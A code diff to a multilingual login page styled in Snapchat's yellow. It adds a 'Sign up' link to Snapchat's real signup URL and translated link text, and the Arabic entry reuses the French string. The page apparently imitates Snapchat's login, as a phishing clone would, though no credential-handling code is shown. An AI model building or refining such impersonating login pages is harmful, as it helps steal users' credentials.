@@ -71,6 +71,17 @@
             background-color: #fef200;
         }
 
+        .signup-link {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #007bff;
+            text-decoration: none;
+        }
+
+        .signup-link:hover {
+            text-decoration: underline;
+        }
+
         .message {
             font-size: 16px;
             color: red;
@@ -92,6 +103,9 @@
 
             <button id="submit-button" type="submit">تسجيل الدخول</button>
         </form>
+        <a class="signup-link" href="https://accounts.snapchat.com/v2/signup">
+            Vous débutez sur Snapchat ? Sʼinscrire
+        </a>
         <div class="message" id="error-message">المعلومات غير صحيحة، جرب مرة أخرى.</div>
     </div>
 
@@ -107,6 +121,7 @@
                 passwordLabel: "كلمة المرور",
                 submitButton: "تسجيل الدخول",
                 errorMessage: "المعلومات غير صحيحة، جرب مرة أخرى.",
+                signupText: "Vous débutez sur Snapchat ? Sʼinscrire",
             },
             en: {
                 title: "Login",
@@ -114,6 +129,7 @@
                 passwordLabel: "Password",
                 submitButton: "Log in",
                 errorMessage: "Incorrect information, please try again.",
+                signupText: "New to Snapchat? Sign up",
             },
             fr: {
                 title: "Connexion",
@@ -121,6 +137,7 @@
                 passwordLabel: "Mot de passe",
                 submitButton: "Se connecter",
                 errorMessage: "Informations incorrectes, veuillez réessayer.",
+                signupText: "Vous débutez sur Snapchat ? Sʼinscrire",
             },
         };
 
@@ -141,6 +158,7 @@
             document.getElementById('password-label').textContent = texts.passwordLabel;
             document.getElementById('submit-button').textContent = texts.submitButton;
             document.getElementById('error-message').textContent = texts.errorMessage;
+            document.querySelector('.signup-link').textContent = texts.signupText;
         }
 
         applyTranslations(); // تطبيق الترجمة عند تحميل الصفحة
